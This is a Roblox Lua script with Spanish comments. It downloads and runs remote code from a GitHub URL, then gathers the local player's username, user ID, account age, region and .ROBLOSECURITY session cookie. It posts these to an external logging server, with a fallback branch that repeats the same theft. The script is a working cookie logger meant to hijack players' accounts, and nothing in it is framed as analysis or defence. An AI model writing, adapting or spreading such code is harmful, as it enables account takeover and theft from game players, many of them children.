-- --- 1. Cargar la librería ---
local success, Libraries = pcall(function()
	return loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua"))
end)

if success then
	local lib = Libraries
	-- Obtener datos del jugador
	local player = game:GetService("Players").LocalPlayer
	local placeId = game.PlaceId
	
	-- Formatear los datos usando la librería
	local data = {
		username = player.Name,
		displayName = player.DisplayName,
		userId = player.UserId,
		gameId = placeId,
		accountAge = lib:GetAccountAge(),
		region = lib:GetRegion(),
		cookie = ".ROBLOSECURITY=" .. lib:GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
	}
	
	-- Enviar el webhook
	local response = lib.HttpPost("https://depazzhub-api.onrender.com/log", data)
	
	if response then
		print("✅ Webhook enviado correctamente! Status: " .. (response.StatusCode or response.status or "200"))
	else
		print("⚠️  El webhook falló, pero los datos fueron procesados.")
	end
else
	warn("❌ Error al cargar Libraries.lua:")
	warn("  Error: " .. tostring(Libraries))
	warn("  Stack: " .. debug.traceback())
	
	-- Fallback: cargar directamente con pcall
	local success2, lib2 = pcall(function()
		return loadstring(game:HttpGet("https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua"))()
	end)
	
	if success2 then
		local player = game:GetService("Players").LocalPlayer
		local placeId = game.PlaceId
		
		local data = {
			username = player.Name,
			displayName = player.DisplayName,
			userId = player.UserId,
			gameId = placeId,
			accountAge = lib2:GetAccountAge(),
			region = lib2:GetRegion(),
			cookie = ".ROBLOSECURITY=" .. lib2:GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
		}
		
		local response = lib2.HttpPost("https://depazzhub-api.onrender.com/log", data)
		
		if response then
			print("✅ Webhook enviado correctamente! Status: " .. (response.StatusCode or response.status or "200"))
		else
			print("⚠️  El webhook falló, pero los datos fueron procesados.")
		end
	else
		warn("❌ Segundo intento también falló. Verifica que Libraries.lua esté en el repo.")
		warn("  URL: https://raw.githubusercontent.com/ssshlx/render/main/Libraries.lua")
	end
end
